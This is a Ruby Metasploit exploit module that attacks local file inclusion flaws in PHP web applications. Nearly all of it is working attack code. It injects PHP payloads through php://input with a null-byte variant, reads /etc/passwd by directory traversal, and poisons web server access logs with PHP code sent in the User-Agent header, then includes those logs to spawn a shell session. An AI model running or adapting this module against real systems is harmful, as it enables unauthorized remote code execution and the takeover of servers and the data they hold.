# 
# Copyright (c) 2011 GhostHunter
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
   
   require 'msf/core'
   require 'rex/proto/ntlm/message'
   require "base64"
   
   class Metasploit3 < Msf::Exploit::Remote
   
	Rank = ManualRanking
   
   	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
   			'Name'           => ' PHP LFI ',
   			'Version'        => '1',
   			'Description'    => 'This module attempts to perform a LFI attack against a PHP application',
			'Author'         => [ 'ghost' ],
			'License'        => BSD_LICENSE,
			'References'     => [ ],
			'Privileged'     => false,
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					# max header length for Apache,
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					'Space'       => 8190,
					# max url length for some old versions of apache according to
					# http://www.boutell.com/newfaq/misc/urllength.html
					#'Space'       => 4000,
					'DisableNops' => true,
					'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Keys'        => ['php'],
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0
			))

   		register_options(
   			[
   				Opt::RPORT(80),
   				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
   					'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
   				OptString.new('URI', [ true, "The URI to authenticate against. The variable with 'xxLFIxx' will be used for the injection" ]),
   				OptString.new('LogFiles', [ true, "Log files used to inject PHP code into",'/var/log/httpd/access_log:/home/kippo/cherokee/distrib/var/log/cherokee.access:/var/log/cherokee.access'])
   			], self.class)
   	end
   

	def exploit_generic

		print_status("Clean LFI injection")
   		res = send_request_cgi({
			'agent'   => datastore['UserAgent'],
   			'uri'     => datastore['URI'].gsub("xxLFIxx", "php://input"),
   			'method'  => 'POST',
			'data'    => '<?php '+payload.encoded+'?>',
   		}, 100)
		cleanup()
		if not session_created?()
			print_status("LFI injection with %00 trick")
   			res = send_request_cgi({
				'agent'   => datastore['UserAgent'],
   				'uri'     => datastore['URI'].gsub("xxLFIxx", "php://input%00"),
   				'method'  => 'POST',
				'data'    => '<?php '+payload.encoded+'?>',
   			}, 100)
			cleanup()
		end
	end  

	def inject_log(logf,agent)
   		res = send_request_cgi({
			'agent'   => agent,
   			'uri'     => datastore['URI'].gsub("xxLFIxx", "../../../../../../../../../../.."+logf),
   			'method'  => 'GET',
   		}, 100)
		cleanup()
		return res
	end

	def exploit_loginjection
		nullbytepoisoning=false
		injectable=false

		print_status("Testing /etc/passwd")
		res = inject_log("/etc/passwd",datastore['UserAgent'])
		if res.code >= 200 and res.code <=299 and res.body=~/sbin\/nologin/ 
			print_status("log injection without null byte poisioning")
			injectable=true
		else
			res = inject_log("/etc/passwd%00",datastore['UserAgent'])
			if res.code >= 200 and res.code <=299 and res.body=~/sbin\/nologin/ 
				print_status("injection with null byte poisioning")
				nullbytepoisoning=true
				injectable=true
			end

		end
		
		if not injectable
			return false
		end

		print_status("Injecting the webserver log files")
		index=0
		logs=datastore['LogFiles'].split(":")

		while not session_created?() and index < logs.length 
			logf=logs[index]
			print_status('Trying to poison '+logf)
			if nullbytepoisoning
				logf=logf+"%00"
			end

			res = inject_log(logf,datastore['UserAgent'])
			if res.body=~ /#{Regexp.escape(datastore['UserAgent'])}/
				print_status('Poisoning '+logf+' Via the UserAgent')
				res = inject_log(logf,'<?php '+payload.encoded+'?>')
				sleep(30)
				print_status("calling the shell")
				res = inject_log(logf,datastore['UserAgent'])
			end
			index=index+1
		end

	end
 
   	def exploit
		fp=http_fingerprint()
		print_status("Trying generic exploits")
		exploit_generic()
		if not session_created?()
			print_status("Trying OS based exploits")
			if ( fp =~/unix/i )
				print_status("Detected a Unix server")
				#TODO /proc/self/environ injection
				exploit_loginjection()
				# TODO ssh logs injection
				# TODO mail.log maillog  injection
			else
				print_status("Are they running Windows?!?")
			end
		end
   	end
   end
